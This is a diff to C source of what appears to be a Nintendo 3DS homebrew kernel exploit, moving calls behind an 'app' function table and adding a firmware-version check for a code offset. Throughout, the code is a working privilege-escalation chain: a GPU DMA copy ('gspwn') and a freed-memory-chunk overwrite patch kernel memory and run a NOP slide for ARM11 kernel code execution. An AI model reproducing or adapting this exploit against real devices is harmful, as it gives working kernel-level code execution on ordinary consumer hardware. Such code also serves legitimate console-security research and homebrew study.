@@ -12,20 +12,20 @@ void gspwn_copy(void *dest, void *src, uint32_t length, int check, int check_off
     int *check_loc = (int *)(check_mem + check_offset);
 
     while(*check_loc != check) {
-        memcpy(check_mem, check_mem, 0x10000);
-        GSPGPU_FlushDataCache(src, length);
+        app->memcpy(check_mem, check_mem, 0x10000);
+        app->GSPGPU_FlushDataCache(src, length);
 
         uint32_t arr1[] = {4, (uint32_t)src, (uint32_t)dest, length,
                            0xFFFFFFFF, 0xFFFFFFFF, 8, 0};
-        nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue((void *)APP_GPUHANDLE, arr1);
+        app->nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue((void *)app->gpuHandle, arr1);
 
-        GSPGPU_FlushDataCache(check_mem, 0x10);
+        app->GSPGPU_FlushDataCache(check_mem, 0x10);
 
         uint32_t arr2[] = {4, (uint32_t)dest, (uint32_t)check_mem, 0x10,
                            0xFFFFFFFF, 0xFFFFFFFF, 8, 0};
-        nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue((void *)APP_GPUHANDLE, arr2);
+        app->nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue((void *)app->gpuHandle, arr2);
 
-        memcpy(check_mem, check_mem, 0x10000);
+        app->memcpy(check_mem, check_mem, 0x10000);
     }
 }
 
@@ -57,7 +57,7 @@ void memchunk_arm11hax(void (*func)())
 
     // Free some random chunk of memory
     uint32_t tmp_addr;
-    svcControlMemory(&tmp_addr, mem_hax_mem_free, NULL, 0x1000, 1 /* MEMOP_FREE */, 0);
+    app->svcControlMemory(&tmp_addr, mem_hax_mem_free, NULL, 0x1000, 1 /* MEMOP_FREE */, 0);
 
     // arm11_buffer is the location that is copied *from* when using gspwn_copy
     uint32_t *arm11_buffer = (uint32_t *)APP_ARM11_BUFFER;
@@ -70,7 +70,7 @@ void memchunk_arm11hax(void (*func)())
     gspwn_copy(mem_hax_mem_free, arm11_buffer, 0x10, fw->kernel_patch_address, 4);
 
     // Trigger kernel write
-    svcControlMemory(&tmp_addr, mem_hax_mem, NULL, 0x1000, 1 /* MEMOP_FREE */, 0);
+    app->svcControlMemory(&tmp_addr, mem_hax_mem, NULL, 0x1000, 1 /* MEMOP_FREE */, 0);
 
     // Tricks to clear the instruction cache
 #if defined(ENTRY_MSET)
@@ -80,7 +80,16 @@ void memchunk_arm11hax(void (*func)())
     build_nop_slide(arm11_buffer, slide_len);
 
     // Copy the NOP slide
-    gspwn_copy((void *)(0x14000000 + APP_CODE_OFFSET + 0x4000), arm11_buffer,
+    uint32_t app_code_offset = 0;
+    uint32_t kernel_version = *(uint32_t *)0x1FF80000;
+    if(kernel_version < 0x02230600) { // firm 4.x
+        app_code_offset = 0x03E6D000;
+    }
+    else { // > firm 4.x
+        app_code_offset = 0x03F00000;
+    }
+
+    gspwn_copy((void *)(0x14000000 + app_code_offset + 0x4000), arm11_buffer,
             slide_len * 4, 0xE1A00000, 0);
 
     // Run the NOP slide
@@ -89,12 +98,12 @@ void memchunk_arm11hax(void (*func)())
     // Fills the bottom buffer with a random pattern
     void *src = (void *)0x18000000;
     for (int i = 0; i < 3; i++) {  // Do it 3 times to be safe
-        GSPGPU_FlushDataCache(src, 0x00038400);
-        GX_SetTextureCopy(src, (void *)0x1F48F000, 0x00038400, 0, 0, 0, 0, 8);
-        svcSleepThread(0x400000LL);
-        GSPGPU_FlushDataCache(src, 0x00038400);
-        GX_SetTextureCopy(src, (void *)0x1F4C7800, 0x00038400, 0, 0, 0, 0, 8);
-        svcSleepThread(0x400000LL);
+        app->GSPGPU_FlushDataCache(src, 0x00038400);
+        app->GX_SetTextureCopy(src, (void *)0x1F48F000, 0x00038400, 0, 0, 0, 0, 8);
+        app->svcSleepThread(0x400000LL);
+        app->GSPGPU_FlushDataCache(src, 0x00038400);
+        app->GX_SetTextureCopy(src, (void *)0x1F4C7800, 0x00038400, 0, 0, 0, 0, 8);
+        app->svcSleepThread(0x400000LL);
     }
 #endif
 
